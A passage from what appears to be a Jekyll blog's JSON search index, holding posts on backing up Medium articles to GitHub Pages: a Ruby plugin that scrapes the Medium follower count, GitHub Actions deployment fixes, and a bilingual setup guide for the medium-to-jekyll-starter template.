Nokogiri::HTML(response.body) follower_count_element = document.at('span.pw-follower-count &gt; a') follower_count = follower_count_element&amp;.text&amp;.split(' ')&amp;.first return follower_count || 0 when Net::HTTPRedirection then location = response['location'] return load_medium_followers(location, limit - 1) else return 0 endend$medium_url = \"https://medium.com/@zhgchgli\"# could also define in _config.yml and retrieve in Jekyll::Hooks.register :site, :pre_render do |site| site.config$medium_followers = load_medium_followers($medium_url)$medium_followers = 1000 if $medium_followers == 0$medium_followers = $medium_followers.to_s.reverse.scan(/\\d{1,3}/).join(',').reverseJekyll::Hooks.register :site, :pre_render do |site| tagline = site.config['tagline'] followMe = &lt;&lt;-HTML &lt;a href=\"#{$medium_url}\" target=\"_blank\" style=\"display: block;text-align: center;font-style: normal;/* text-decoration: underline; */font-size: 1.2em;color: var(--heading-color);\"&gt;#{$medium_followers}+ Followers on Medium&lt;/a&gt; HTML site.config['tagline'] = \"#{followMe}\"; site.config['tagline'] += tagline; meta_data = site.data.dig('locales', 'en', 'meta'); # only impletation in en, could impletation to all langs. if meta_data gmt_plus_8 = Time.now.getlocal(\"+08:00\") formatted_time = gmt_plus_8.strftime(\"%Y-%m-%d %H:%M:%S\") site.data['locales']['en']['meta'] += \"&lt;br/&gt;Last updated: #{formatted_time} +08:00\" endend 原理是註冊一個 Hook 在網站 Render 前，對 config 中的 tagline 個人資料下方介紹內容區塊，多塞上 Medium 追蹤人數顯示 HTML。 Medium 追蹤人數會在每次執行都去爬取拿到最新數字 頁底最後更新時間邏輯也差不多，就是對 locales-&gt;en-&gt;meta 在產生網站時多塞上最後更新時間字串 補充如果是 Hook 文章產生前，可以拿到 Markdown、Hook 文章產生後，可以拿到產生後的 HTML儲存後可以先在本機下 bundle exec jekyll s 測試結果：用瀏覽器打開 127.0.0.1:4000 查看結果。最後在 Github Pages Repo 上的 Actions 加上排程定時自動重新產生網站，就完成了：在 Jekyll (Chirpy Theme) Repo 專案中的 Actions 找到「 pages-deploy.yml 」在 on: 新增： schedule: - cron: \"10 1 * * *\" # 每天 UTC 01:10 自動執行一次, https://crontab.guru Plugin 的優點是可以達到動態內容效果(排程更新內容)、不影響網站架構不會在升級時遇到衝突；缺點就是能調整的內容、顯示位置有局限。Jekyll (Chirpy Theme) v7.x 後的 Github Pages 部署問題除了網站架構的調整外，v.7.x 的部署腳本也有改變；移除了原本的 deploy.sh 部署腳本，直接使用 Github Actions 的部署步驟：# build:# ... - name: Upload site artifact uses: actions/upload-pages-artifact@v3 with: path: \"_site${{ steps.pages.outputs.base_path }}\" deploy: environment: name: github-pages url: ${{ steps.deployment.outputs.page_url }} runs-on: ubuntu-latest needs: build steps: - name: Deploy to GitHub Pages id: deployment uses: actions/deploy-pages@v4但是我在部署的過程遇到了問題：Uploaded artifact size of 1737778940 bytes exceeds the allowed size of 1 GB 因為我的網站內容太大了，導致 Upload Artifact 失敗；但是之前的部署腳本是可以的，所以只好退回去用原本的 deploy.sh ＋ 註解掉上面這一段 。Github Pages 部署時 Test Site 步驟一直不通過Jekyll (Chirpy Theme) 部署有一個步驟是 Test Site 自檢測網頁內容是否正確，例如連結是否正常、HTML 標籤是否有缺漏…等等# build:# ... - name: Test site run: | bundle exec htmlproofer _site \\ \\-\\-disable-external \\ \\-\\-no-enforce-https \\ \\-\\-ignore-empty-alt \\ \\-\\-ignore-urls \"/^http:\\/\\/127.0.0.1/,/^http:\\/\\/0.0.0.0/,/^http:\\/\\/localhost/\"我自己多加了 --no-enforce-https --ignore-empty-alt 忽略 https、html tag沒有 alt 的檢查， 忽略這兩條讓檢查通過(因為暫時無法去改內容) 。htmlproofer 的 CLI 指令官方文件沒有提，翻了好久才在某個 Issue 的 Comment 找到規則：https://github.com/gjtorikian/html-proofer/issues/727#issuecomment-1334430268其他文章補充 Github Pages 自訂網域教學 Linkyee — 使用 GitHub Pages 快速免費建立個人類 LinkTree 連結頁面有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 46 Total Views Last Statistics Date: 2025-08-15 | 42 Views on Medium." }, { "title": "Things to Know About Automatically Backing Up Medium Articles to GitHub Pages (Jekyll)", "url": "/posts/zrealm-dev/en/things-to-know-about-automatically-backing-up-medium-articles-to-github-pages-jekyll-5bb7d3a4954f/", "categories": "ZRealm Dev.", "tags": "medium, jekyll, automation, ios-app-development, github-pages", "date": "2025-01-18 23:12:33 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Things to Know About Automatically Backing Up Medium Articles to GitHub Pages (Jekyl...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Things to Know About Automatically Backing Up Medium Articles to GitHub Pages (Jekyll)A record of building, maintaining, upgrading, and customizing a personal Medium article backup mirror site.IntroductionI’ve been managing my Medium account for six years, and last year, I surpassed 100 articles. As time goes on and the number of articles increases, I worry more about the possibility of Medium suddenly shutting down or my account encountering issues that could lead to the loss of all my hard work. While some articles may not hold much value, many serve as records of technical frameworks and problem-solving thoughts from that time. I often revisit my older articles to refresh my knowledge. Additionally, in recent years, I’ve started documenting my travel experiences abroad, which are cherished memories and have performed well in terms of traffic. Losing this content would mean I could never rewrite it.Developing a Backup ToolI usually write articles directly on the Medium platform without any personal backup. Therefore, during the 2022 New Year period, I took the time to develop a tool to download Medium articles and convert them into Markdown files (including article images, embedded code, etc.) — ZMediumToMarkdown:I then extended the use of this tool to deploy the downloaded Markdown files as a static backup mirror site on GitHub Pages using Jekyll (Chirpy Theme) — https://zhgchg.li/https://zhgchg.li/At that time, I integrated the entire setup into a GitHub Template Repo for friends with similar needs to quickly deploy — ZMediumToJekyll. Since then (in 2022), I haven’t updated the version or settings of Jekyll (Chirpy Theme); however, ZMediumToMarkdown is still being maintained, and I promptly fix any formatting parsing errors that arise. It is currently stable.The version of Jekyll (Chirpy Theme) I was using at that time was v5.x, which had no major issues and included all necessary features (e.g., pinning, categories, tags, cover images, comments, etc.). The only problem was that the page would often become unscrollable while scrolling, but after a few attempts, it would return to normal. This was a frustrating user experience. I once tried upgrading to v6.x, but the issue persisted, and I received no response when reporting it to the official team. Additionally, as versions increase, the conflicts encountered during upgrades become more frequent, so I eventually abandoned the idea of upgrading.Recently, I decided to tackle the issues with Jekyll (Chirpy Theme), upgrade the version, and simultaneously optimize the quick deployment tool ZMediumToJekyll.New! medium-to-jekyll-starter 🎉🎉medium-to-jekyll-starter.github.ioI have integrated the latest version v7.x of Jekyll (Chirpy Theme) with my ZMediumToMarkdown Medium article download and conversion tool into a new — medium-to-jekyll-starter.github.io GitHub Template Repo.You can use this template repo to quickly set up your own Medium mirror content backup site, with a one-time setup for continuous automatic backups, deployed on GitHub Pages completely free. For a step-by-step setup guide, please refer to this article: https://zhgchg.li/posts/zh-TW-medium-to-jekyll/Resultshttps://zhgchg.li/ *All the articles above are automatically downloaded from my Medium account, converted to Markdown format, and re-uploaded. Here’s a comparison example of the conversion results from a random article: Original content on Medium / Converted result on my personal siteAfter the upgrade, the scrolling issue has been resolved, and I also added customized dynamic content (displaying the number of Medium followers).Some Technical RecordsThe deployment method for Jekyll (Chirpy Theme) on GitHub Pages mainly references the official Start Repo: Last month, I also referenced this project to create a new open-source project — Linkyee which is an open-source version of a Link Tree personal link page.https://link.zhgchg.li/Jekyll Customization Method (1) — Override HTMLJekyll is a powerful Ruby static site generator. Jekyll (Chirpy Theme) is just a theme based on Jekyll. Compared to other themes, Chirpy Theme has the best quality, user experience, and comprehensive features.Jekyll pages have inheritance, allowing us to add files with the same page name as Jekyll in ./_layouts. The engine will use your custom page content to replace the original when generating the site content.For example, if I want to add a line of text at the end of each article page, I first copy the original article page file (post.html) and place it in the ./_layouts directory:Using an editor, I open post.html, add the text or customization in the appropriate location, and redeploy the site to see the customized result.You can also create a ./_include directory to store some shared page content files:Then in post.html, you can directly use {% include buymeacoffee.html %} to include the HTML content from the file for reuse. The advantage of overriding HTML layout files is 100% customization; you can freely adjust how the page content and layout are presented. The downside is that during the upgrade process, you may encounter conflicts or unexpected results, requiring you to review your customizations again.Jekyll Customization Method (2) — PluginThe second method is to use the Plugin with the Hook method, injecting your desired custom content during the static content generation phase in Jekyll.There are many Hook events, and here I will only mention the ones I used: site:pre_render and post:pre_render.Adding a hook is simple; just create a Ruby file in ./_plugins.The posts-lastmod-hook.rb is an existing Plugin.I wanted a few “pseudo” dynamic content features, the first being to display the number of Medium followers under my profile and the last updated time at the bottom of the page.In the ./_plugins directory, I created a file named zhgchgli-customize.rb:#!/usr/bin/env ruby#require 'net/http'require 'nokogiri'require 'uri'require 'date'def load_medium_followers(url, limit = 10) return 0 if limit.zero? uri = URI(url) response = Net::HTTP.get_response(uri) case response when Net::HTTPSuccess then document = Nokogiri::HTML(response.body) follower_count_element = document.at('span.pw-follower-count &gt; a') follower_count = follower_count_element&amp;.text&amp;.split(' ')&amp;.first return follower_count || 0 when Net::HTTPRedirection then location = response['location'] return load_medium_followers(location, limit - 1) else return 0 endend$medium_url = \"https://medium.com/@zhgchgli\"# could also define in _config.yml and retrieve in Jekyll::Hooks.register :site, :pre_render do |site| site.config$medium_followers = load_medium_followers($medium_url)$medium_followers = 1000 if $medium_followers == 0$medium_followers = $medium_followers.to_s.reverse.scan(/\\d{1,3}/).join(',').reverseJekyll::Hooks.register :site, :pre_render do |site| tagline = site.config['tagline'] followMe = &lt;&lt;-HTML &lt;a href=\"#{$medium_url}\" target=\"_blank\" style=\"display: block;text-align: center;font-style: normal;/* text-decoration: underline; */font-size: 1.2em;color: var(--heading-color);\"&gt;#{$medium_followers}+ Followers on Medium&lt;/a&gt; HTML site.config['tagline'] = \"#{followMe}\"; site.config['tagline'] += tagline; meta_data = site.data.dig('locales', 'en', 'meta'); # only implementation in en, could implement to all langs. if meta_data gmt_plus_8 = Time.now.getlocal(\"+08:00\") formatted_time = gmt_plus_8.strftime(\"%Y-%m-%d %H:%M:%S\") site.data['locales']['en']['meta'] += \"&lt;br/&gt;Last updated: #{formatted_time} +08:00\" endend The principle is to register a hook before the site renders, adding the Medium follower count to the tagline section under the profile. The Medium follower count will be fetched each time to get the latest number. The logic for the last updated time at the bottom is similar; it adds the last updated time string to locales-&gt;en-&gt;meta during site generation. Additionally, if it’s a hook before article generation, you can access the Markdown, and after article generation, you can access the generated HTML.After saving, you can test the results locally with bundle exec jekyll s:Open your browser and go to 127.0.0.1:4000 to check the results.Finally, add a scheduled job in the Actions of your GitHub Pages Repo to automatically regenerate the site:In the Jekyll (Chirpy Theme) Repo project, find the Actions file named pages-deploy.yml and add the following under on:: schedule: - cron: \"10 1 * * *\" # Automatically execute once a day at UTC 01:10, https://crontab.guru The advantage of using plugins is that it allows for dynamic content updates (scheduled content updates) without affecting the site structure, avoiding conflicts during upgrades. The downside is that the content and display positions you can adjust are limited.Issues with GitHub Pages Deployment After Jekyll (Chirpy Theme) v7.xIn addition to structural adjustments, the deployment script for v7.x has also changed; the original deploy.sh deployment script has been removed, and the deployment steps now directly use GitHub Actions:# build:# ... - name: Upload site artifact uses: actions/upload-pages-artifact@v3 with: path: \"_site${{ steps.pages.outputs.base_path }}\" deploy: environment: name: github-pages url: ${{ steps.deployment.outputs.page_url }} runs-on: ubuntu-latest needs: build steps: - name: Deploy to GitHub Pages id: deployment uses: actions/deploy-pages@v4However, I encountered an issue during deployment:Uploaded artifact size of 1737778940 bytes exceeds the allowed size of 1 GB because my site content was too large, causing the Upload Artifact to fail. Since the previous deployment script worked, I had to revert to using the original deploy.sh and comment out the above section.GitHub Pages Deployment Test Site Step FailingThe deployment of Jekyll (Chirpy Theme) includes a step to test the site, checking if the web content is correct, such as whether links are functioning and if HTML tags are missing, etc.:# build:# ... - name: Test site run: | bundle exec htmlproofer _site \\ --disable-external \\ --no-enforce-https \\ --ignore-empty-alt \\ --ignore-urls \"/^http:\\/\\/127.0.0.1/,/^http:\\/\\/0.0.0.0/,/^http:\\/\\/localhost/\"I added --no-enforce-https and --ignore-empty-alt to ignore HTTPS and missing alt checks for HTML tags, which allowed the checks to pass (since I couldn’t modify the content temporarily).The CLI command for htmlproofer is not documented in the official documentation, and I spent a long time searching before finding the rules in a comment on a certain issue here.Link to the original commentAdditional Articles Guide to Custom Domains on GitHub Pages Linkyee — Quickly Create a Personal LinkTree Page for Free Using GitHub PagesIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 46 Total Views Last Statistics Date: 2025-08-15 | 42 Views on Medium." }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-zrealm-robotic-process-automation/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 1 Total Views", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 1 Total Views" }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-zrealm-life/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 1 Total Views", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 1 Total Views" }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-zrealm-dev/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 1 Total Views", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 1 Total Views" }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 3 Total Views", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 3 Total Views" }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-travel-diaries/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers" }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-tools/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers" }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-pinkoi-engineering/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers" }, { "title": "The URL has been moved. Click here to view it if you are not redirected", "url": "/posts/the-url-has-been-moved-click-here-to-view-it-if-you-are-not-redirected-kkday-tech-blog/", "categories": "", "tags": "", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers", "content": "➡️➡️➡️ The URL has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers" }, { "title": "[English] Medium to Jekyll Installation and Configuration Guide", "url": "/posts/english-medium-to-jekyll-installation-and-configuration-guide-en-medium-to-jekyll/", "categories": "", "tags": "medium, github, jekyll, ruby", "date": "2025-01-17 08:00:00 +0800", "snippet": "➡️➡️➡️ The post has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 50 Total Views", "content": "➡️➡️➡️ The post has been moved. Click here to view it if you are not redirected.Improve this page on Github.Follow Me on Medium 1K+ Followers 50 Total Views" }, { "title": "[正體中文] Medium to Jekyll 安裝設定教學", "url": "/posts/tools/%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87-medium-to-jekyll-%E5%AE%89%E8%A3%9D%E8%A8%AD%E5%AE%9A%E6%95%99%E5%AD%B8-medium-to-jekyll/", "categories": "tools", "tags": "meidum, github, jekyll, ruby", "date": "2025-01-17 08:00:00 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI. 简体中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io點擊右上角「Use th...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI. 简体中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io點擊右上角「Use this template」-&gt;「Create a new repository」2. Create a new repository Repository name: 通常為 帳號或組織名稱.github.io，必須以 *.github.io 為結尾。 必須為 Public Repo 才能使用 Github Pages調整 GitHub Actions 執行權限 建立後，由於 GitHub 的安全性設定，您需要前往儲存庫設定中啟用 GitHub Actions 的執行權限。3. Create gh-pages branch if needed 在 Repo 主頁點擊「main」分支選單，輸入「gh-pages」，若無則選擇「Create branch gh-pages from main」 若 gh-pages 分支已存在、或建立時出現「Sorry, that branch already exists.」則可跳過此步驟4. Enable Github Pages，前往 Settings -&gt; Pages -&gt; Build and deployment 選擇「gh-pages」分支，點擊「Save」儲存設定執行首次部署 Repo -&gt; 「Actions」-&gt;「Build and Deploy」-&gt;「Run workflow」-&gt;「Branch: main, Run workflow」5. 等待所有部署工作完成 🟢 pages build and deployment 🟢 Build and Deploy6. 前往網站查看結果 https://帳號或組織名稱.github.ioTroubleshooting如果頁面只顯示：--- layout: home # Index page ---代表 Github Pages 設定錯誤或還在部署中、或是之前的頁面 Cache，請使用強制刷新貨無痕瀏覽器重新打開一次網頁。 首次部署成功！🎉🎉🎉請繼續設定成同步您的 Medium 帳號。Github Repo (Github Actions) 設定1. 前往所屬 Github Repo 的 Github Actions 頁面 -&gt; 點擊「ZMediumToMarkdown」-&gt; 點擊「ZMediumToMarkdown.yml」 https://github.com/{ORG}/{REPO_NAME}/blob/main/.github/workflows/ZMediumToMarkdown.yml 2. 點擊右方編輯按鈕 3. 設定 Medium 文章自動同步參數name: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # Runs at 01:10(UTC), everyday. # 設定排程多久自動同步一次 # ref: https://crontab.guru/jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: \"--cookie_uid ${{ secrets.MEDIUM_COOKIE_UID }} --cookie_sid ${{ secrets.MEDIUM_COOKIE_SID }} -j zhgchgli_test\" # zhgchgli_test 替換成你的 Meidum 使用者 # 例如 https://medium.com/@zhgchgli -&gt; zhgchgli # ref: https://github.com/ZhgChgLi/ZMediumToMarkdown?tab=readme-ov-file#usage提供有存取權限的 Medium 帳號 Cookies。 若您有在 Paywall 的文章則必須提供 若發現 Medium 文章同步不完整 (缺漏文章)，代表同步時被 Medium 防火牆阻擋，也必須提供取得 Meidum 帳號 Cookies MEDIUM_COOKIE_UID &amp; MEDIUM_COOKIE_SID 步驟： 登入擁有存取權限的 Medium 帳號，進入 Medium 後台 在空白處點擊右鍵 選擇「Inspect」 出現 Developer Console 後選擇「Application」 選擇「Cookies」-&gt;「https://medium.com」 往下滾動找到「sid」「uid」 點兩下複製這兩個欄位的值將 Meidum 帳號 Cookies 安全存放在 Github Repo Secrets1. 前往 Github Repo Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret https://github.com/{ORG}/{REPO_NAME}/settings/secrets/actions/new 2. New secret - MEDIUM_COOKIE_SID Name: MEDIUM_COOKIE_SID Secret: 貼上上一步複製的 Medium 帳號 sid 值 3. New secret - MEDIUM_COOKIE_UID Name: MEDIUM_COOKIE_UID Secret: 貼上上一步複製的 Medium 帳號 uid 值 完成帳號無特別登出或遇到問題，Cookies 不會失效。如果在同步中出現以下訊息並且同步的文章不完整：This post is behind Medium's paywall. You must provide valid Medium Member login cookies to download the full post.代表 Cookies 已失效，請重新照上述步驟重新設定。4. 首次手動同步，Repo -&gt; Github Actions -&gt; 點擊「ZMediumToMarkdown」-&gt; 點擊「Enable workflow」初次執行，我們可以自己手動同步一次檢查設定是否正確。5. 等待同步文章與網站部署工作完成等待以下三個 Actions 工作執行完成並且沒有錯誤： 🟢 ZMediumToMarkdown 🟢 pages build and deployment 🟢 Build and Deploy6. 重整網頁查看結果，Enjoy! ⚠️ 請注意！所有檔案變更都會觸發： 🟢 pages build and deployment 🟢 Build and Deploy 需等待以上兩個部署工作完成，網站更改才會生效。Jekyll 網站設定網站基本設定 ./_config.yml 請務必調整 其中的 url: 改成您的 Github Pages 網址以及其他網站資料設定。 分享功能設定：./_data/share.yml 定義文章作者資訊：./_data/authors.yml左側 Sidebar 設定 ./tabs 底部連結按鈕：./_data/contact.yml網站底部及其他文字內容設定 ./locales/{Lang}.yml default is /locales/en.yml本地測試 確定你的環境有安裝並使用 Ruby &gt;= 3.1 版本 cd ./ bundle install bundle exec jekyll s Go to http://127.0.0.1:4000/ 查看結果 Press Ctrl-c to stop.*網站基本設定檔案有調整需要重新執行才會生效。Improve this page on Github.Follow Me on Medium 1K+ Followers 16 Total Views" }, { "title": "[简体中文] Medium to Jekyll 安装设定教学", "url": "/posts/tools/cn/%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87-medium-to-jekyll-%E5%AE%89%E8%A3%85%E8%AE%BE%E5%AE%9A%E6%95%99%E5%AD%A6-medium-to-jekyll/", "categories": "tools", "tags": "meidum, github, jekyll, ruby", "date": "2025-01-17 08:00:00 +0800", "snippet": " 正體中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io点击右上角「Use this template」-&gt;「Create a new repository」2. Create a new repository Repository nam...", "content": " 正體中文 English Start!1. 前往 Template Repo -&gt; medium-to-jekyll-starter.github.io点击右上角「Use this template」-&gt;「Create a new repository」2. Create a new repository Repository name: 通常为 帐号或组织名称.github.io，必须以 *.github.io 为结尾。 必须为 Public Repo 才能使用 Github Pages调整 GitHub Actions 执行权限 建立后，由于 GitHub 的安全性设定，您需要前往储存库设定中启用 GitHub Actions 的执行权限。3. Create gh-pages branch if needed 在 Repo 主页点击「main」分支选单，输入「gh-pages」，若无则选择「Create branch gh-pages from main」 若 gh-pages 分支已存在、或建立时出现「Sorry, that branch already exists.」则可跳过此步骤4. Enable Github Pages，前往 Settings -&gt; Pages -&gt; Build and deployment 选择「gh-pages」分支，点击「Save」储存设定执行首次部署 Repo -&gt; 「Actions」-&gt;「Build and Deploy」-&gt;「Run workflow」-&gt;「Branch: main, Run workflow」5. 等待所有部署工作完成 🟢 pages build and deployment 🟢 Build and Deploy6. 前往网站查看结果 https://帐号或组织名称.github.ioTroubleshooting如果页面只显示：--- layout: home # Index page ---代表 Github Pages 设定错误或还在部署中、或是之前的页面 Cache，请使用强制刷新货无痕浏览器重新打开一次网页。 首次部署成功！🎉🎉🎉请继续设定成同步您的 Medium 帐号。Github Repo (Github Actions) 设定1. 前往所属 Github Repo 的 Github Actions 页面 -&gt; 点击「ZMediumToMarkdown」-&gt; 点击「ZMediumToMarkdown.yml」 https://github.com/{ORG}/{REPO_NAME}/blob/main/.github/workflows/ZMediumToMarkdown.yml 2. 点击右方编辑按钮 3. 设定 Medium 文章自动同步参数name: ZMediumToMarkdownon:workflow_dispatch:schedule:- cron: \"10 1 15 * *\"# Runs at 01:10(UTC), everyday.# 设定排程多久自动同步一次# ref: https://crontab.guru/jobs:ZMediumToMarkdown:runs-on: ubuntu-lateststeps:- name: ZMediumToMarkdown Automatic Botuses: ZhgChgLi/ZMediumToMarkdown@mainwith:command: \"--cookie_uid ${{ secrets.MEDIUM_COOKIE_UID }} --cookie_sid ${{ secrets.MEDIUM_COOKIE_SID }} -j zhgchgli_test\"# zhgchgli_test 替换成你的 Meidum 使用者# 例如 https://medium.com/@zhgchgli -&gt; zhgchgli# ref: https://github.com/ZhgChgLi/ZMediumToMarkdown?tab=readme-ov-file#usage提供有存取权限的 Medium 帐号 Cookies。 若您有在 Paywall 的文章则必须提供 若发现 Medium 文章同步不完整 (缺漏文章)，代表同步时被 Medium 防火墙阻挡，也必须提供取得 Meidum 帐号 Cookies MEDIUM_COOKIE_UID &amp; MEDIUM_COOKIE_SID 步骤： 登入拥有存取权限的 Medium 帐号，进入 Medium 后台 在空白处点击右键 选择「Inspect」 出现 Developer Console 后选择「Application」 选择「Cookies」-&gt;「https://medium.com」 往下滚动找到「sid」「uid」 点两下复制这两个栏位的值将 Meidum 帐号 Cookies 安全存放在 Github Repo Secrets1. 前往 Github Repo Settings -&gt; Secrets and variables -&gt; Actions -&gt; New repository secret https://github.com/{ORG}/{REPO_NAME}/settings/secrets/actions/new 2. New secret - MEDIUM_COOKIE_SID Name: MEDIUM_COOKIE_SID Secret: 贴上上一步复制的 Medium 帐号 sid 值 3. New secret - MEDIUM_COOKIE_UID Name: MEDIUM_COOKIE_UID Secret: 贴上上一步复制的 Medium 帐号 uid 值 完成帐号无特别登出或遇到问题，Cookies 不会失效。如果在同步中出现以下讯息并且同步的文章不完整：This post is behind Medium's paywall. You must provide valid Medium Member login cookies to download the full post.代表 Cookies 已失效，请重新照上述步骤重新设定。4. 首次手动同步，Repo -&gt; Github Actions -&gt; 点击「ZMediumToMarkdown」-&gt; 点击「Enable workflow」初次执行，我们可以自己手动同步一次检查设定是否正确。5. 等待同步文章与网站部署工作完成等待以下三个 Actions 工作执行完成并且没有错误： 🟢 ZMediumToMarkdown 🟢 pages build and deployment 🟢 Build and Deploy6. 重整网页查看结果，Enjoy! ⚠️ 请注意！所有档案变更都会触发： 🟢 pages build and deployment 🟢 Build and Deploy 需等待以上两个部署工作完成，网站更改才会生效。Jekyll 网站设定网站基本设定-./_config.yml请务必调整 其中的 url: 改成您的 Github Pages 网址以及其他网站资料设定。 分享功能设定：./_data/share.yml 定义文章作者资讯：./_data/authors.yml左侧 Sidebar 设定-./tabs 底部连结按钮：./_data/contact.yml网站底部及其他文字内容设定-./locales/{Lang}.yml default is /locales/en.yml本地测试 确定你的环境有安装并使用 Ruby &gt;= 3.1 版本2.cd ./3.bundle install4.bundle exec jekyll s Go to http://127.0.0.1:4000/ 查看结果 Press Ctrl-c to stop.*网站基本设定档案有调整需要重新执行才会生效。Improve this page on Github.Follow Me on Medium 1K+ Followers 16 Total Views" }, { "title": "[English] Medium to Jekyll Installation and Configuration Guide", "url": "/posts/tools/en/english-medium-to-jekyll-installation-and-configuration-guide-medium-to-jekyll/", "categories": "tools", "tags": "medium, github, jekyll, ruby", "date": "2025-01-17 08:00:00 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版 简体中文 正體中文 Start!1. Go to Template Repo -&gt; medium-to-jekyll-...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版 简体中文 正體中文 Start!1. Go to Template Repo -&gt; medium-to-jekyll-starter.github.ioClick “Use this template” in the upper right corner -&gt; “Create a new repository”2. Create a new repository Repository name: Usually username_or_organization.github.io, must end with *.github.io. Must be a Public Repo to use GitHub Pages.Adjust GitHub Actions Execution Permissions After creation, due to GitHub’s security settings, you need to go to the repository settings to enable GitHub Actions execution permissions.3. Create gh-pages branch if needed On the Repo homepage, click the “main” branch dropdown, enter “gh-pages”, if it does not exist, select “Create branch gh-pages from main”. If the gh-pages branch already exists, or if you see “Sorry, that branch already exists.” when creating, you can skip this step.4. Enable GitHub Pages, go to Settings -&gt; Pages -&gt; Build and deployment Select the “gh-pages” branch, click “Save” to save the settings.Execute the First Deployment Repo -&gt; “Actions” -&gt; “Build and Deploy” -&gt; “Run workflow” -&gt; “Branch: main, Run workflow”.5. Wait for all deployment tasks to complete 🟢 pages build and deployment 🟢 Build and Deploy6. Go to the website to check the results https://username_or_organization.github.ioTroubleshootingIf the page only displays:--- layout: home # Index page ---It indicates that the GitHub Pages settings are incorrect or still deploying, or it may be a cached page from before. Please use a hard refresh or open the page again in incognito mode. Deployment successful for the first time! 🎉🎉🎉 Please continue to set it up to sync your Medium account.Github Repo (Github Actions) Setup1. Go to the Github Actions page of your Github Repo -&gt; Click on “ZMediumToMarkdown” -&gt; Click on “ZMediumToMarkdown.yml” 